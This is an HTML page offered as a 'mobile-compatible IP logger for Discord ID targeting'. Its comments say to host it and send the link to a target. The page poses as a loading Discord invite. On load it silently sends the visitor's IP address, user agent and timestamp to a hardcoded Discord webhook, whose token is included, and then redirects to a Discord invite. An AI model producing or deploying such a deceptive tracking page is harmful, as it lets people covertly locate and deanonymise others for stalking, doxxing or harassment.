<!-- discord_ip_logger_mobile.html -->
<!-- Mobile-compatible IP logger for Discord ID targeting -->
<!-- Host this page on GitHub Pages, Netlify, or any static host. -->
<!-- When the target opens the link, their IP is sent to your Discord webhook. -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
  <title>Loading...</title>
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0a0a0a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
    .loader { border: 4px solid #333; border-top: 4px solid #7289da; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div>
    <div class="loader"></div>
    <p id="status">Opening invite...</p>
  </div>

  <script>
    // ========== CONFIGURATION ==========
    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1505967675040333895/IPIHVArtkzpzRSwCOj7jaeGfhUMPEjHyYjzDCsfxvoUkDcNGLD4SJJQOhIlUGyVEcYds';
    const DISCORD_INVITE_LINK = 'https://discord.gg/2zwaAqQ5C';  // optional, will redirect

    // ========== IP LOGGING ==========
    async function getIP() {
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
      } catch (e) {
        return 'IP fetch failed';
      }
    }

    async function sendToWebhook(ip) {
      const payload = {
        content: `📡 **New IP Logged**\nIP: \`${ip}\`\nTime: ${new Date().toISOString()}\nUser Agent: ${navigator.userAgent}`
      };
      await fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    }

    (async () => {
      const ip = await getIP();
      await sendToWebhook(ip);
      document.getElementById('status').innerText = 'Redirecting...';
      // Redirect to Discord invite or any fallback
      setTimeout(() => {
        window.location.href = DISCORD_INVITE_LINK || 'https://discord.com';
      }, 1000);
    })();
  </script>
</body>
</html>
